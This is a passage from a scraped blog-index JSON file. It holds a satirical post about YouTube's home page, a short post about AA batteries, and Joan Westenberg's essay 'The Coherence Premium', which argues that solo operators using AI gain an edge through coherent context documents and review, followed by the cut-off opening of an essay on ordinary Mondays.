be.</p>"},{"location":"jayd.ml/Someone%20At%20YouTube%20Needs%20Glasses-%20The%20Prophecy%20Has%20Been%20Fulfilled_20251110/","title":"Someone At YouTube Needs Glasses: The Prophecy Has Been Fulfilled","text":"<p>\u6765\u6e90: https://jayd.ml \u94fe\u63a5: https://jayd.ml/2025/11/10/someone-at-youtube-needs-glasses-prophecy-fulfilled.html \u65e5\u671f: 2025-11-10T07:48:00+00:00</p> <p>In my recent analysis of YouTube\u2019s information density  I included the results from an advanced statistical analysis on the number of videos present on the home page, which projected that around May 2026 there would only be one lonely video on the home screen.</p> <p></p> <p>Amazingly, a disgruntled Googler leaked a recording of how YouTube\u2019s PM org handled the criticism as it sat at the top of Hacker News for a whole day for some reason.</p> <p>The net result is that after months of hard work by ~~Gemini~~ YouTube engineers, the other day I fired up YouTube on an Apple TV and was graced with this:</p> <p></p> <p>Let\u2019s analyze this picture and count the number of videos on the home screen:</p> <p></p> <p>Unfortunately the YouTube PM org\u2019s myopia is accelerating: with this data I now project that there will be zero videos on the homescreen around May of 2026 now, up from September.</p> <p></p> <p>Apparently Poe\u2019s Law applies to Google PMs, satire is dead, and maybe our mandatory NeuraLinks are coming sooner than I thought.</p>"},{"location":"jeffgeerling.com/","title":"jeffgeerling.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Ode to the AA Battery 20260129</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"jeffgeerling.com/Ode%20to%20the%20AA%20Battery_20260129/","title":"Ode to the AA Battery","text":"<p>\u6765\u6e90: jeffgeerling.com \u53d1\u5e03\u65f6\u95f4: Thu, 29 Jan 2026 11:00:00 -0600 \u94fe\u63a5: https://www.jeffgeerling.com/blog/2026/ode-to-the-aa-battery/</p> <p>Recently this post from @Merocle caught my eye:</p> <p>I'm fixing my iFixit soldering station. I haven't used it for a long time and the battery has gone overdischarge. I hope it will come back to life. Unfortunately, there are no replacements available for sale at the moment.</p> <p>Devices with built-in rechargeable batteries have been bugging me a lot lately. It's convenient to have a device you can take with you and use anywhere. And with modern Li-ion cells, battery life is remarkable.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:01</p>"},{"location":"joanwestenberg.com/","title":"joanwestenberg.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>The Coherence Premium 20260202</li> <li>Your Life is the Sum Total of 2,000 Mondays 20260131</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/","title":"The Coherence Premium","text":"<p>\u6765\u6e90: joanwestenberg.com \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 22:41:04 GMT \u94fe\u63a5: https://www.joanwestenberg.com/the-coherence-premium/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.joanwestenberg.com/rss/', 'value': '<p>I don't necessarily believe in second brains. The notion (pun-intended) that you can offload your thinking to a perfectly organized system of notes and links has always struck me as a fantasy. The people I know who've built elaborate Notion databases or Obsidian vaults mostly end up with digital hoarding problems, where the system becomes the work. And I'm broadly skeptical of the Claude Code productivity discourse, the idea that AI tools will let you 10x your output if you prompt them correctly. (Most people using AI are producing more stuff faster without any clear sense of whether the stuff is good or consistent or even pointed in the right direction.)</p><p>But I do believe in something adjacent to both of these ideas, something that borrows from the second brain concept without the hoarding, and from AI tooling without the context-free prompting: I believe in coherence as a system.</p><p>In 1937, the British economist Ronald Coase asked a question that seems almost embarrassingly simple: why do firms exist at all? If markets are so efficient at allocating resources, why don't we just have billions of individuals contracting with each other for every task? Why do we need these hulking organizational structures called companies?</p><p>His answer, which eventually won him a Nobel Prize, was transaction costs. It's expensive to negotiate contracts and coordinate with strangers, to monitor performance and enforce agreements. Firms exist because sometimes it's cheaper to bring activities inside an organization than to contract for them on the open market. The boundary of the firm, Coase argued, sits wherever the cost of internal coordination equals the cost of external transaction.</p><p>This was a brilliant insight in '37, but Coase couldn't have anticipated what happens when transaction costs collapse. When software eats coordination. When a single person with the right tools can do what used to require a department. When AI can execute tasks that once demanded teams of specialists.</p><p>We're in a Coasean inversion. The economics that made large firms necessary are reversing. But most people are looking at this transformation through the wrong lens. They see AI as a productivity tool, a way to do more faster. They measure success in hours saved or output multiplied, and this misses the point entirely.</p><p>The solopreneur's advantage is not solely speed, and it's certainly not \"lower costs\" despite what a good too many seem to think. </p><p>The advantage is coherence.</p></p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#what-coherence-actually-means","title":"what coherence actually means","text":"<p>When I say coherence, I mean something specific: the degree to which every part of an operation derives from the same understanding, the same model of reality and set of priorities and tradeoffs.</p><p>When you work alone, you have a problem and you understand the context because you lived it and touched it and experienced it first-hand. You make a decision based on that understanding, execute the decision, see the results, and update your understanding. The entire loop happens inside one mind.</p><p>What happens in a large organization facing the same problem? Someone identifies the problem, but they don't have authority to solve it. They write a report explaining the problem to someone who does have authority. That person reads the report, but they don't have the original context, so they ask clarifying questions. The answers come back, filtered through email or a meeting. A decision gets made, but the people who have to implement it weren't in the room. They recieve instructions that encode the decision but not the reasoning. They execute the instructions as best they understand them. The results come back through multiple layers of reporting. By the time the original decision-maker sees what happened, months have passed and the context has shifted again.</p><p>This is the basic challenge of coordination across minds. Every handoff loses information, every translation introduces drift, and every layer of abstraction moves further from ground truth.</p><p>Organizations have spent decades trying to solve this problem. They've built elaborate systems of documentation, standardized processes, metrics and KPIs, regular meetings, shared values statements, company cultures. All of these are attempts to create coherence across minds. And they all fail, in different ways and to different degrees, because they're fighting against something that won't budge: knowledge is sticky and context is lossy, and understanding doesn't transfer perfectly between humans.</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#the-pathology-of-process-drift","title":"the pathology of process drift","text":"<p>A company starts small, with the founders doing everything themselves. They make decisions quickly because they understand everything about the business, and the business works.</p><p>The company grows and the founders can't do everything anymore. They hire people and try to transfer their understanding. But understanding doesn't transfer easily, so they also transfer processes. \"This is how we do X. Use this checklist for Y. Follow these steps.\"</p><p>The processes work, mostly. But the new employees don't have the context that generated those processes. They don't know why step three comes before step four, and they don't know which parts are essential and which parts were arbitrary choices. So when situations arise that the process doesn't quite cover, they either follow the process rigidly and get suboptimal results, or they improvise and create inconsistency.</p><p>More growth, more employees, more processes. The processes start interacting in ways nobody anticipated. The sales process assumes certain things about the product process. The product process assumes certain things about the engineering process. When those assumptions drift out of alignment, you get friction and delays and finger-pointing.</p><p>The company responds by adding coordination mechanisms like project managers, alignment meetings, and cross-functional reviews. These help, but they also add overhead, and they create their own drift: the coordination layer develops its own processes, its own assumptions, its own information loss.</p><p>Eventually you reach a point where a significant fraction of the organization's energy goes toward internal coordination rather than actual value creation. A 2022 Microsoft study found that employees in large organizations spend over 50% of their time on internal communication and coordination. Half the payroll, dedicated to getting the organization to agree with itself.</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#context-fragmentation","title":"context fragmentation","text":"<p>More information means the coordination problem gets worse, not better. This seems counterintuitive, because shouldn't more information make everyone more aligned?</p><p>But information isn't understanding. Understanding = integration, and integration happens in minds. More information means more raw material that each mind has to process differently.</p><p>A typical large organization's knowledge base is spilling over with strategy documents from last year and the year before, project postmortems from dozens of initiatives, customer research reports, competitive analyses, technical specifications, meeting notes, email threads, Slack channels, and wiki pages. </p><p>Somewhere in there (the elusive somewhere...) is everything you need to know to make a good decision.</p><p>But nobody has synthesized it all, and nobody has integrated it into a coherent model. Each person reads a fragment, interprets it through their own context, and forms their own understanding. When they discuss decisions with colleagues, they're not comparing the same mental models but rather different interpretations of different subsets of the available information.</p><p>This is context fragmentation. People don't disagree on facts; they're operating from different maps of the same territory. And because the maps are implicit, inside people's heads, nobody realizes they're not looking at the same thing.</p><p>The proliferation of AI tools in large organizations means that now each employee has their own AI assistant, trained on whatever context they happen to feed it, producing outputs that reflect their particular understanding of the situation. The AI amplifies individual perspectives rather than creating shared ones.</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#single-player-mode-advantage","title":"single-player mode advantage","text":"<p>When you're operating alone, you have one context, one understanding, one model of your business and your market and your customers and your strategy. That model lives in your head, and it's coherent because there's only one mind maintaining it.</p><p>If // when you use AI tools, you're feeding them from that single source of truth. The AI doesn't have its own understanding that might drift from yours, and it operates within the context you provide. If you give it good context, it executes within that context. If your understanding is coherent, the AI's outputs will be coherent.</p><p>This is the inversion of the traditional organization's problem. In a large organization, you have many minds with their own contexts, trying to coordinate through AI tools that amplify their differences. As a solo operator, you have one mind with one context, using AI tools to execute within that coherent frame.</p><p>The AI handles the execution at scale while you maintain the coherence. This division of labor plays to the strengths of each party: humans are good at integration and judgment, while AI is good at execution and volume. The solo operator with AI gets the benefits of scale without the costs of coordination.</p><p>But this only works if you actually maintain coherence. </p><p>If you're using AI to do random shit faster, you're not capturing the advantage. The advantage comes from having a tight operating model that the AI operates within.</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#the-coherence-stack","title":"the coherence stack","text":"<p>Think of it as a stack with four layers, each feeding the one below it.</p><pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502         MIND LAYER (You)            \u2502\\n\u2502  Understanding, judgment, strategy  \u2502\\n\u2502    The source of coherence          \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n                  \u2502 feeds\\n                  \u25bc\\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502         CONTEXT LAYER               \u2502\\n\u2502  Operating model, constraints       \u2502\\n\u2502  Voice guidelines, decision logs    \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n                  \u2502 constrains\\n                  \u25bc\\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502        EXECUTION LAYER (AI)         \u2502\\n\u2502  Content, code, research, analysis  \u2502\\n\u2502  Customer responses at scale        \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n                  \u2502 produces\\n                  \u25bc\\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502          OUTPUT LAYER               \u2502\\n\u2502   Coherence-checked artifacts       \u2502\\n\u2502   What actually ships               \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n                  \u2502 feedback\\n                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba Mind Layer\\n</code></pre><p>At the top is the mind layer, which is you: your understanding, your judgment, your integrated model of the business. This layer can't be automated or delegated, and it's the source of coherence.</p><p>Below that is the context layer, where you externalize your understanding into documents that AI tools can consume. Your operating model, your constraints and tradeoffs, your voice guidelines, your decision history. This layer translates what's in your head into something machines can work with.</p><p>Below that is the execution layer, where AI operates. Content generation, research, analysis, code, customer responses. The AI works within the constraints provided by the context layer, producing outputs at scale.</p><p>At the bottom is the output layer, which is what actually ships. But nothing reaches this layer without passing through a coherence check: does this output reflect my model? Would I have produced something like this? Does it fit with everything else?</p><p>The stack only works if information flows correctly. The mind layer feeds the context layer through deliberate documentation, the context layer constrains the execution layer through careful prompting, and the output layer feeds back to the mind layer through review, which sometimes triggers updates to your understanding.</p><p>Most people using AI skip the context layer entirely. They go straight from a vague intention to an AI prompt to shipped output. This is how you get drift // how you end up with an operation that feels incoherent, where different pieces don't quite fit together, where customers sense something is off even if they can't articulate what.</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#building-your-context-layer","title":"building your context layer","text":"<p>The context layer is where the work happens. It's the translation mechanism between your understanding and AI execution. Get this right and coherence becomes automatic; get it wrong and you're constantly fighting drift.</p><p>Start with your operating model - a working description of how your business actually functions. </p><p>I structure mine around five questions.</p><pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502               OPERATING MODEL                          \u2502\\n\u2502            (Five Core Questions)                       \u2502\\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\\n\u2502                                                        \u2502\\n\u2502  1. PROBLEM &amp; AUDIENCE                                 \u2502\\n\u2502     What problem do I solve, for whom specifically?    \u2502\\n\u2502     Not demographics. The person in the moment.        \u2502\\n\u2502                                                        \u2502\\n\u2502  2. THESIS                                             \u2502\\n\u2502     Why does my approach work?                         \u2502\\n\u2502     The real theory, not marketing language.           \u2502\\n\u2502                                                        \u2502\\n\u2502  3. TRADEOFFS                                          \u2502\\n\u2502     What am I optimizing for, at what expense?         \u2502\\n\u2502     Make the choices explicit.                         \u2502\\n\u2502                                                        \u2502\\n\u2502  4. BOUNDARIES                                         \u2502\\n\u2502     What do I explicitly not do?                       \u2502\\n\u2502     The boundaries define the shape.                   \u2502\\n\u2502                                                        \u2502\\n\u2502  5. VOICE                                              \u2502\\n\u2502     How do I actually sound?                           \u2502\\n\u2502     Words I use. Words I avoid. Stance toward reader.  \u2502\\n\u2502                                                        \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n</code></pre><ul><li>What problem do I solve, and for whom specifically? Steer clear of demographics; you need a description of the person in the moment they need what I offer. What are they trying to do, and what's getting in their way?</li><li>What's my actual thesis for why my approach works? Why does my solution address the problem better than alternatives?</li><li>What are the core tradeoffs I've chosen? Every business is a bundle of tradeoffs, and I'm optimizing for X at the expense of Y. Making these explicit prevents drift, because when a new opportunity arises, I can check it against my tradeoffs rather than deciding ad hoc.</li><li>What do I explicitly not do? This is more useful than describing what you do, because the boundaries define the shape.</li><li>How do I sound? What words do I use, what words do I avoid, what's my stance toward the reader? Capturing this helps AI maintain consistency across outputs.</li></ul><p>This document should be short enough to include in AI prompts. If it's longer than a page, you haven't distilled it enough. The goal is compression without loss of generative power.</p><p>Next, build your constraints file. These are the decision-making rails that keep outputs on track. I think of them as principles // functional rules that generate answers.</p><p>For example: \"When choosing between comprehensive and focused, choose focused. Our readers are busy and will bounce if they don't get value in the first paragraph.\" That's a constraint that actually constrains, telling the AI (and me) how to resolve a common tradeoff.</p><p>Include examples. Point to a piece you wrote that exemplifies the voice, and one that doesn't. Concrete examples communicate more than abstract descriptions.</p><p>Finally, maintain a decision log. When you make a significant choice, write down what you decided and why. This creates institutional memory for a one-person institution. When similar situations arise later, you (or your AI tools) can refrence how you've handled them before. This prevents the common failure mode where you decide the same question differently each time because you forgot your previous reasoning.</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#a-coherence-check","title":"a coherence check","text":"<p>Every output that ships should pass through a coherence check. This can be quick, but it can't be skipped.</p><pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502                  COHERENCE CHECK                       \u2502\\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\\n\u2502  \u25a1 Does this sound like one person wrote it?           \u2502\\n\u2502  \u25a1 Would I explain it this way?                        \u2502\\n\u2502  \u25a1 Does it reflect my specific tradeoffs?              \u2502\\n\u2502  \u25a1 Could a competitor produce this? (Should be no)     \u2502\\n\u2502  \u25a1 Does it fit with everything else I've shipped?      \u2502\\n\u2502                                                        \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n</code></pre><p>The questions:</p><ul><li>Does this sound like one person wrote it? AI tends toward a certain homogeneity, and if an output could have been produced by anyone, it's not coherent with my operation.</li><li>Would I explain it this way? The same framing, the examples, the emphasis? If I'd approach it differently, the output needs revision or I need to update my context documents.</li><li>Does it show // hold my specific tradeoffs? If I've chosen focused over comprehensive, is this output focused? If I've chosen accessible over technical, is this accessible?</li><li>Could a competitor produce this? If the answer is yes, the output isn't coherent enough. It's not distinctive and doesn't come from my particular understanding.</li><li>Does it fit with everything else I've shipped? Coherence is cumulative, and each output should feel like it belongs with the others. If this piece would feel out of place next to my other work, something's wrong.</li></ul><p>You can automate part of this. Feed your AI tool your recent outputs and ask it to compare a new draft against them, flagging inconsistencies. But the final judgment has to be yours. You're the source of coherence, and the check is really asking: does this feel like mine?</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#anti-patterns-that-break-coherence","title":"anti-patterns that break coherence","text":"<p>I've watched myself and others struggle with this. </p><p>A few failure modes reliably produce drift:</p><pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502            COHERENCE ANTI-PATTERNS                     \u2502\\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\\n\u2502                                                        \u2502\\n\u2502  CONTEXT STARVATION                                    \u2502\\n\u2502  \u2514\u2500\u25ba AI works from generic training, not your model    \u2502\\n\u2502                                                        \u2502\\n\u2502  OUTPUT ACCUMULATION                                   \u2502\\n\u2502  \u2514\u2500\u25ba Shipping without review; deviations compound      \u2502\\n\u2502                                                        \u2502\\n\u2502  MODEL STALENESS                                       \u2502\\n\u2502  \u2514\u2500\u25ba Understanding evolves, documents don't            \u2502\\n\u2502                                                        \u2502\\n\u2502  FRAGMENTED TOOLING                                    \u2502\\n\u2502  \u2514\u2500\u25ba Different tools, different contexts, drift        \u2502\\n\u2502                                                        \u2502\\n\u2502  DECISION AMNESIA                                      \u2502\\n\u2502  \u2514\u2500\u25ba No rationale logged; inconsistent future choices  \u2502\\n\u2502                                                        \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n</code></pre><ul><li>Context starvation is the most common. You ask AI to do something without feeding it your operating model, your constraints, your voice. The AI does its best, but it's working from generic training rather than your specific understanding. The output is competent but not coherent.</li><li>Output accumulation is context starvation's downstream consequence. You ship AI outputs without proper review, and each one is slightly off from your model. The deviations accumulate. After a few months, your operation no longer reflects your understanding because most of what you've shipped wasn't actually generated from your understanding.</li><li>Model staleness happens when your understanding evolves but your context documents don't. You learn something that changes how you think about the business, but you don't propagate that update to your operating model or constraints file. Now your AI tools are working from an outdated picture.</li><li>Fragmented tooling = using different AI tools with different contexts. You use one tool for writing and another for code and another for research, and each has different context, different prompts, different understandings of what you're doing. The outputs don't cohere because they're not coming from the same source.</li><li>Decision amnesia = making choices without recording the reasoning. You decide something, move on, and three months later face a similar choice with no memory of how you handled it before. You decide differently this time. Now you have inconsistent decisions in your history, and any AI tool referencing your past work will find contradictions.</li></ul>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#the-fragmentation-audit","title":"the fragmentation audit","text":"<p>You should audit your operation for coherence as often as possible. I do this monthly, AI tools or not, AI be damned, but the frequency matters less than doing it at all.</p><p>Pull your last twenty or thirty outputs, whether blog posts, emails, product updates, or whatever you've shipped. Lay them out and look for the implied beliefs and positions in each. What does this piece assume about the reader? What does it prioritize, and what stance does it take?</p><p>You're looking for drift: places where piece A assumes one thing and piece B assumes something different, places where your voice shifted without intention, places where you contradicted yourself purely because you genuinely forgot what you'd said before.</p><p>When you find inconsistencies, you have two options. Either reconcile them by updating your model (maybe you actually did change your mind, and the recent piece reflects your current thinking), or flag them as errors and correct going forward.</p><p>This audit also reveals context layer gaps. If you keep finding drift in a particular area, your context documents probably don't cover that area well enough. Add constraints, add examples, make the implicit explicit.</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#why-this-beats-scale","title":"why this beats scale","text":"<p>Large organizations have obvious advantages. They have capital, they have brand recognition, distribution, expertise, redundancy, Las Vegas conferences etc. A solo operator can't compete on those dimensions.</p><p>But think what those advantages actually buy. Capital lets you hire more people, and more people means more coordination overhead and context fragmentation. Brand recognition helps customers find you, but it doesn't help you serve them coherently. Distribution gets your product to more places, but each touchpoint introduces opportunities for inconsistency. Expertise is great, but experts in different domains don't automaticaly share mental models.</p><p>Meanwhile, the solo operator with a coherent system has advantages that don't show up on traditional metrics. Every customer interaction comes from the same understanding, and every piece of content reflects the same perspective. Every product decision follows from the same model. The operation feels like one thing, because it is one thing.</p><p>Customers experience this as quality, even if they can't articulate why. They sense that someone understands what they're doing and why, and they don't encounter the cognitive dissonance of dealing with an organization that can't agree with itself.</p><p>The dynamic that makes this sustainable is that coherence compounds. Each decision you make within your model reinforces the model, and each output that reflects your understanding strengthens your position. Your operation becomes more legible over time, both to you and to your customers. Meanwhile, large organizations' incoherence also compounds, with each misalignment creating more misalignment and each process drift opening space for more drift.</p><p>The gap widens.</p><p>The coherence advantage works best in domains where the value comes from understanding rather than from physical or regulatory scale. Knowledge work, creative work, advisory work, software, content, education, consulting. These are domains where a coherent perspective can outcompete a fragmented organization's superior resources.</p><p>And the opportunity is unique: the technology exists to operate at scale while maintaining the coherence of a single mind. The window is open because large organizations haven't figured out how to respond. Their answer to AI so far has been to give everyone AI tools and hope for productivity gains, which accelerates their fragmentation...</p>"},{"location":"joanwestenberg.com/The%20Coherence%20Premium_20260202/#the-coherence-moat","title":"the coherence moat","text":"<p>Scale used to be the moat. You built a big organization with lots of resources, and the sheer weight of your operation protected you from smaller competitors. Transaction costs made it hard for anyone to replicate what you'd built.</p><p>But transaction costs are collapsing. The activities that used to require organizations can increasingly be performed by individuals with the right tools.</p><p>The Coasean logic that justified large firms is weakening.</p><p>If there is a new moat (and I'll admit, that's a big \"if\") it probably looks like coherence; the ability to operate as one mind, one understanding, one model, even as you execute at scale. Large organizations can't have this because they're composed of many minds. Solo operators can have it by default, if they're deliberate about maintaining it.</p><p>The solo operator who builds a coherent system and lets AI execute within it has an advantage that doesn't need venture capital, doesn't need hiring, and doesn't ask for the whole apparatus of organizational scaling.</p><p>Scale breaks coherence. Coherence is the moat.</p>'}"},{"location":"joanwestenberg.com/Your%20Life%20is%20the%20Sum%20Total%20of%202%2C000%20Mondays_20260131/","title":"Your Life is the Sum Total of 2,000 Mondays","text":"<p>\u6765\u6e90: joanwestenberg.com \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 00:25:46 GMT \u94fe\u63a5: https://www.joanwestenberg.com/your-life-is-the-sum-total-of-2-000-mondays/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.joanwestenberg.com/rss/', 'value': '<p>We plan our lives like we're editing a movie trailer.</p><p>The trip to Portugal, or the product launch, or the transformation photo at the gym. The big moment where everything crystallizes into meaning. We accumulate these peaks in our imagination, and then arrange them into a montage that proves our existence mattered, and that we really lived.</p><p>Then we spend the actual substance of our lives doing laundry and feeling crappy about it...</p><p>A few years ago, I saw Douglas Coupland (author of Microserfs and Generation X, and one of my personal favorite writers) on a panel at the Sydney Writers' Festival. One of the other panelists - an influencer with a recently published quasi-self-help memoir - delivered a long, dreamy anecdote about finding the true meaning of life while watching butterflies drift over a waterfall in some far-flung locale. </p><p>When she finished, the moderator asked Coupland what he thought. </p><p>He said butterflies and waterfalls are all well and good, but they're not real life. They're a flash in the pan - a spike of adrenaline and dopamine. And if you can only find meaning in those brief, luminous moments, you're in for a world of trouble.</p><p>Put it another way:</p><p>If you work a standard career from twenty-five to sixty-five, you'll experience roughly 2,080 Mondays. That's 2,080 alarm clocks set against your biological preferences and 2,080 inbox avalanches, plus 2,080 instances of navigating traffic or public transit while still metabolically processing the weekend. Add in the Tuesdays through Fridays, and you're looking at roughly 10,400 ordinary workdays across a career. Meanwhile, if you're fortunate enough to take two weeks of vacation annually for forty years, you'll accumulate 560 vacation days. The ratio is roughly 19:1 in favor of the mundane.</p><p>So we get to a question worth sitting with: </p><p>Do you actually like your average Monday?</p></p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"joanwestenberg.com/Your%20Life%20is%20the%20Sum%20Total%20of%202%2C000%20Mondays_20260131/#the-peak-experience-fallacy","title":"The peak experience fallacy","text":"<p>Abraham Maslow spent decades studying what he called \"peak experiences,\" those episodes of ecstasy and transcendence that seemed to characterize the healthiest human specimens. His 1964 work on self-actualization celebrated these episodes as evidence of psychological flourishing, and the positive psychology movement that followed made peak experience cultivation into something approaching a secular religion. </p><p>(And don't we love a good secular religion.) </p><p>But in 